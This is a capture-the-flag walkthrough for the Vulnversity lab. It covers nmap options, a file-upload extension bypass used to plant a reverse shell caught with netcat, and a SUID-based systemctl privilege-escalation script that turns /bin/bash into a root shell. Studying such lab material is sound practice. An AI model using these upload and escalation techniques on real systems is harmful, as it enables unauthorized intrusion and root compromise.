# WriteUp for Vulnversity


Nmap Cheatsheet
```
-sV	Attempts to determine the version of the services running
-p <x> or -p-	Port scan for port <x> or scan all ports
-Pn	Disable host discovery and just scan for open ports
-A	Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	Scan with the default nmap scripts
-v	Verbose mode
-sU	UDP port scan
-sS	TCP SYN port scan
-n  Will not resolve DNS
```
We see that port 3333 has webserver running which we can exploit using dirsearch, through which we found /internal/ upload page.

For checking the allowed extentions we can use BurSuite but we can automate it with python like (this)[extention_checker.py] and from this we find that .phtml is a valid extention.
So we can upload our revshell and start is from /uploads directory while listening on the port with netcat.

On finding the connection we can get the /home/bill/user.txt.

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

![image](Suid.jpg)

Command to find all the SUID files
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>dev/null
```
/bin/systemctl is not a normal SUID binary.
```
-rwsr-xr-x 1 root root 659856 Feb 13  2019 systemctl
```
We can find a way to exploit this on GTFO bins.
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
bin/systemctl link $TF
bin/systemctl enable --now $TF
```
Now if we run ```bash -p```, now we are root.
And we can access /root.txt.